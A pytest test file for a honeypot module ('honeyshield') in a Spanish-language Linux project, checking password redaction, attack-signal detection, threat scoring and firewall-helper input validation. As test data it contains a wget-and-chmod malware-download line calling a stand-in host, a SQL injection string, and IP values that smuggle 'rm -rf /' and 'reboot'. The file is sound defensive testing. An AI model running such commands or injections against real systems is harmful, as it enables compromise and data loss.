import asyncio
import importlib.machinery
import importlib.util
import json
from pathlib import Path

import pytest

from umbra import honeyshield as hs
from umbra.modules import honeyshield_module
from umbra.nyx.rules import match

ROOT = Path(__file__).resolve().parents[1]
HELPER = ROOT / "iso/config/includes.chroot/usr/libexec/umbra/honeyshield-cortafuegos"


def test_off_by_default_and_settings_roundtrip(tmp_path):
    s = hs.load_settings(tmp_path / "no.toml")
    assert s.activo is False
    s.activo, s.direccion = True, "127.0.0.1"
    p = hs.save_settings(s, tmp_path / "h.toml")
    assert hs.load_settings(p).activo and hs.load_settings(p).direccion == "127.0.0.1"
    p.write_text('activo = true\ndireccion = "8.8.8.8"\n')
    assert hs.load_settings(p).direccion == "0.0.0.0"  # dirección rara: se ignora


def test_decoys_use_high_ports():
    assert all(port > 1024 for port, _ in hs.DECOYS.values())


def test_printable_removes_terminal_escapes():
    out = hs.printable(b"\x1b[2Jhola\x00\r\n" + b"x" * 400)
    assert "\x1b" not in out and "\x00" not in out and out.endswith("…")


def test_credentials_keep_user_never_password():
    assert hs.credentials("ftp", b"USER admin\r\nPASS secreto\r\n") == ["admin"]
    assert hs.credentials("telnet", b"root\npassword123\n") == ["root"]
    assert hs.credentials("http", b"POST / HTTP/1.1\r\n\r\nusername=pepe&password=1234") == ["pepe"]
    for svc in ("ftp", "telnet", "http"):
        assert not any("secreto" in u or "1234" in u for u in hs.credentials(svc, b"USER a\r\nPASS secreto 1234"))


def test_samples_never_keep_passwords():
    cases = [("ftp", b"USER admin\r\nPASS secreto\r\n"), ("telnet", b"root\r\nsecreto\r\n"),
             ("http", b"POST / HTTP/1.1\r\nAuthorization: Basic c2VjcmV0bw==\r\n\r\nuser=a&password=secreto"),
             ("smtp", b"EHLO x\r\nAUTH LOGIN\r\nYWRtaW4=\r\nc2VjcmV0bw==\r\n")]
    for svc, raw in cases:
        out = hs.printable(hs.redact(svc, raw), 400)
        assert "secreto" not in out and "c2VjcmV0bw" not in out, (svc, out)


def test_attack_signals():
    assert "descarga de malware" in hs.signals(b"cd /tmp; wget http://x.y/bot; chmod +x bot")
    assert "inyección SQL" in hs.signals(b"GET /?id=1 UNION SELECT password FROM users")
    assert "búsqueda de paneles" in hs.signals(b"GET /.env HTTP/1.1")
    assert hs.signals(b"hola") == []


def test_threat_score_grows_with_behaviour():
    tr = hs.Tracker()
    ev = lambda svc, **kw: {"ip": "192.168.1.50", "ts": 1.0, "servicio": svc, **kw}  # noqa: E731
    t, raised = tr.add(ev("ssh"))
    assert t.level == "baja" and raised is None
    rises = [tr.add(ev(svc))[1] for svc in ("ftp", "telnet")]
    assert t.level == "media" and rises.count("baja") == 1  # escaneo de varios puertos: sube una vez
    t, _ = tr.add(ev("telnet", usuarios=["root"], señales=["intento de shell", "descarga de malware"]))
    assert t.level == "alta" and "ataque" in t.summary()["que_hace"]
    assert tr.ranking()[0]["ip"] == "192.168.1.50"


def test_valid_block_ip():
    assert hs.valid_block_ip(" 203.0.113.9 ") == "203.0.113.9"
    for bad in ("127.0.0.1", "0.0.0.0", "224.0.0.1", "169.254.1.1", "hola", "1.2.3.4; rm -rf /"):
        with pytest.raises(ValueError):
            hs.valid_block_ip(bad)


def _run_pot(tmp_path, client):
    events = []

    async def go():
        pot = hs.Honeypot("127.0.0.1", events.append, ports={n: 0 for n in hs.DECOYS},
                          events_file=tmp_path / "e.jsonl")
        await pot.start()
        try:
            return await client(pot)
        finally:
            await pot.stop()

    return asyncio.run(go()), events


def test_honeypot_end_to_end(tmp_path):
    async def client(pot):
        greetings = {}
        r, w = await asyncio.open_connection("127.0.0.1", pot.bound["ftp"])
        greetings["ftp"] = await r.readline()
        w.write(b"USER admin\r\n")
        await w.drain()
        greetings["ftp2"] = await r.readline()
        w.write(b"PASS nopass\r\n")
        w.close()
        r, w = await asyncio.open_connection("127.0.0.1", pot.bound["http"])
        w.write(b"GET /.env HTTP/1.1\r\nHost: x\r\n\r\n")
        await w.drain()
        greetings["http"] = await r.read(200)
        w.close()
        await asyncio.sleep(0.3)
        return greetings

    g, events = _run_pot(tmp_path, client)
    assert g["ftp"].startswith(b"220") and g["ftp2"].startswith(b"331") and g["http"].startswith(b"HTTP/1.1 200")
    assert len(events) == 2
    ftp = next(e for e in events if e["servicio"] == "ftp")
    assert ftp["usuarios"] == ["admin"] and "nopass" not in json.dumps(ftp)
    http = next(e for e in events if e["servicio"] == "http")
    assert "búsqueda de paneles" in http["señales"]
    saved = (tmp_path / "e.jsonl").read_text().splitlines()
    assert len(saved) == 2 and oct((tmp_path / "e.jsonl").stat().st_mode)[-3:] == "600"


def test_honeypot_reads_at_most_4kb(tmp_path):
    async def client(pot):
        r, w = await asyncio.open_connection("127.0.0.1", pot.bound["smtp"])
        await r.readline()
        try:
            w.write(b"A" * 100_000)
            await w.drain()
        except ConnectionError:
            pass
        await asyncio.sleep(0.5)
        w.close()

    _, events = _run_pot(tmp_path, client)
    assert events and events[0]["bytes"] <= hs.MAX_READ


def test_module_risks():
    m = honeyshield_module.build()
    acts = {a.id: a for a in m.actions}
    from umbra.security import Risk
    assert acts["honeyshield.status"].risk == Risk.LOW
    for k in ("enable", "disable", "block", "unblock"):
        assert acts[f"honeyshield.{k}"].risk == Risk.MEDIUM
    with pytest.raises(ValueError):
        acts["honeyshield.block"].precheck(ip="127.0.0.1")


@pytest.mark.parametrize("text,action", [
    ("bloquea la IP 203.0.113.9", "honeyshield.block"),
    ("desbloquea 203.0.113.9", "honeyshield.unblock"),
    ("activa honeyshield", "honeyshield.enable"),
    ("apaga los señuelos", "honeyshield.disable"),
    ("¿quién me está atacando?", "honeyshield.threats"),
    ("estado de honeyshield", "honeyshield.status"),
])
def test_rules(text, action):
    plan = match(text)
    assert plan and plan.calls[0].action_id == action


def test_firewall_helper_only_fixed_commands():
    import sys

    sys.dont_write_bytecode = True  # no dejar __pycache__ dentro de los archivos de la ISO
    loader = importlib.machinery.SourceFileLoader("hs_helper", str(HELPER))
    spec = importlib.util.spec_from_loader("hs_helper", loader)
    mod = importlib.util.module_from_spec(spec)
    try:
        loader.exec_module(mod)
    finally:
        sys.dont_write_bytecode = False
    calls = []
    mod.ufw = lambda *a: calls.append(a)
    assert mod.main(["bloquear", "203.0.113.9"]) == 0 and calls[-1][-3] == "203.0.113.9"
    assert mod.main(["bloquear", "127.0.0.1"]) == 2
    assert mod.main(["bloquear", "1.2.3.4;reboot"]) == 2
    assert mod.main(["reset"]) == 2
    assert mod.main(["abrir"]) == 0 and len(calls) == 1 + len(mod.PORTS)
    assert set(mod.PORTS) == {str(p) for p, _ in hs.DECOYS.values()}


def test_iso_wiring():
    inc = ROOT / "iso/config/includes.chroot"
    assert HELPER.stat().st_mode & 0o111
    assert "os.umbra.honeyshield" in (inc / "usr/share/polkit-1/actions/os.umbra.navegador.policy").read_text()
    assert "sleep" in (inc / "etc/xdg/autostart/umbra-honeyshield.desktop").read_text()
    hook = (ROOT / "iso/config/hooks/normal/9000-umbra.hook.chroot").read_text()
    assert "umbra-honeyshield" in hook and "honeyshield-cortafuegos" in hook
